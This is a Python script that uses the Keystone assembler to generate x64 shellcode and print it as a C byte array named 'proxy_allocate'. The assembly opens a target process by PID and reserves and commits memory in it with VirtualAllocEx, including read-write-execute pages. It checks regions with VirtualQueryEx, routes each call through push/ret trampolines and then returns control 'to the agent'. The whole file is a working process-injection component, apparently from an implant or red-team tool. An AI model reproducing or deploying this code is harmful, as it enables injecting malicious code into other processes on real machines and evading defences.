from keystone import *
import ctypes, struct

CODE = (
    " start: "
        " mov rax, 0x4141414141414141; " # Shellcode size
        " mov qword ptr [rbp+0xE0], rax;"
        # OpenProcess
        " mov rcx, 0x0428; " #dwDesiredAccess
        " xor rdx, rdx; "
        " mov r8, 0x42424242; " # Process PID
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x38]; "
        " push rbx; "
        " ret; "
        " mov qword ptr [rbp+0xB8], rax; "
        " mov qword ptr [rbp+0xA0], rax; "
        # VirtualAllocEx (1 - reserve)
        " mov rcx, [rbp+0xB8];"
        " xor rdx, rdx; "
        " mov r8, 0x1000; "
        " mov r9, 0x2000; "
        " push 0x04; "
        " push r9; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x58]; "
        " push rbx; "
        " ret; "
        " mov qword ptr [rbp+0x90], rax; "
        # VirtualAllocEx (1 - commit)
        " mov rcx, [rbp+0xB8];"
        " mov rdx, [rbp+0x90];"
        " mov r8, 0x1000; "
        " mov r9, 0x1000; "
        " push 0x40; "
        " push r9; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x58]; "
        " push rbx; "
        " ret; "
        # Storing entrypoint addr in temp as it will be rewritten by QirtualQuery
        " mov rax, [rbp+0xF8];" 
        " mov qword ptr [rbp+0xA8], rax; "      
        # VirtualAllocEx (2)
        " mov r12, 0x4343434343434343;" # Required granularities
        " xor r13, r13; "
        " mov r14, 0x4545454545454545;" 
        " reserve_initial_memory: "
            " mov rcx, [rbp+0xB8]; "
            " xor rdx, rdx; "
            " mov r8, 0x10000;"
            " mov r9, 0x2000;"
            " mov r10, 0x04;" # PAGE_READ_WRITE
            " push r10; "
            " push r9; "
            " push r8; "
            " push rdx; "
            " push rcx; "
            " lea rbx, [rip]; " # ROP call function
            " add rbx, 0x0b;"
            " push rbx; "
            " mov rbx, [rbp+0x58]; "
            " push rbx; "
            " ret; "
            " mov qword ptr [rbp+0x98], rax ;" # Save BaseAddress for later usage
            " inc r13; " # increase the granularities counter since the initial one was allocated
            " cmp r13, r12; "
            " jge EndAlloc;"
        " check_available_memory: "
            " mov rcx, [rbp+0xB8];"
            " mov rdx, [rbp+0x98]; "
            " add rdx, 0x10000;"
            " mov r8, rbp;"
            " add r8, 0xF0; "
            " mov r9, 0x30; "
            " push r9; "
            " push r8; "
            " push rdx; "
            " push rcx; "
            " lea rbx, [rip]; " # ROP call function
            " add rbx, 0x0b;"
            " push rbx; "
            " mov rbx, [rbp+0x68]; " # VirtualQueryEx
            " push rbx; "
            " ret; "
            " mov rax, [rbp+0x108];"
            " cmp rax, r14;"
            " jl cleanup;"
            " mov rdx, [rbp+0x98]; " # load saved address of the initial allocation and move it 1 granularity
            " add rdx, 0x10000; "  
            " jmp reserve_additional_memory;"
        
        " cleanup:"
            " mov rcx, [rbp+0xB8];"
            " xor rdx, rdx; "
            " mov r8, 0x00008000; "
            " push r8; "
            " push rdx; "
            " push rcx; "
            " lea rbx, [rip]; " # ROP call function
            " add rbx, 0x0b;"
            " push rbx; "
            " mov rbx, [rbp+0x60]; "
            " push rbx; "
            " ret; "
            " xor r13, r13; " # decrease the granularities counter since the initial allocation was released
            " jmp reserve_initial_memory;"
        " reserve_additional_memory:"
            " mov rcx, [rbp+0xB8]; "
            " mov r8, 0x10000;"
            " mov r9, 0x2000;"
            " mov r10, 0x04;"
            " push r10; "
            " push r9; "
            " push r8; "
            " push rdx; "
            " push rcx; "
            " lea rbx, [rip]; " # ROP call function
            " add rbx, 0x0b;"
            " push rbx; "
            " mov rbx, [rbp+0x58]; "
            " push rbx; "
            " ret; "
            " inc r13; "
            " mov rdx, rax; "
            " add rdx, 0x10000; "
            " cmp r13, r12; "
            " jl reserve_additional_memory; "
        " EndAlloc:"
        # VirtualAllocEx (2 - commit)
        " mov rdx, [rbp+0x98]; "
        " xor r13, r13; "
        " mov rax, 0x4444444444444444;"
        " mov qword ptr [rbp+0xC8], rax; "
        " commit: "
            " inc r13; "
            " mov rcx, [rbp+0xB8]; "
            " mov r8, 0x01;;"
            " mov r9, 0x1000;"
            " mov r10, 0x40;"
            " push r10; "
            " push r9; "
            " push r8; "
            " push rdx; "
            " push rcx; "
            " lea rbx, [rip]; " # ROP call function
            " add rbx, 0x0b;"
            " push rbx; "
            " mov rbx, [rbp+0x58]; "
            " push rbx; "
            " ret; "
            " pop rdx; "
            " pop rdx; "
            " add rdx, 1000h; "
            " mov rax, [rbp+0xC8];"
            " cmp r13, rax; "
            " jne commit; " 
        # Restoring entrypoint address
        " mov rax, [rbp+0xA8];" 
        " mov qword ptr [rbp+0xF8], rax;"
       
        # Return to the agent
        " mov rbx, [rbp+0xC0];"
        " push rbx; "
        " ret;"
        

)
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
instructions = ""
i=1
for dec in encoding: 
    if(i % 20 == 0) and (i<len(encoding)):
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n")
        instructions += "\"\r\n\""
    else:
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n") 
    i+=1
print("unsigned char proxy_allocate[] = (\r\n\"" + instructions + "\");\r\n")
print("// Size: " + str(len(encoding)))



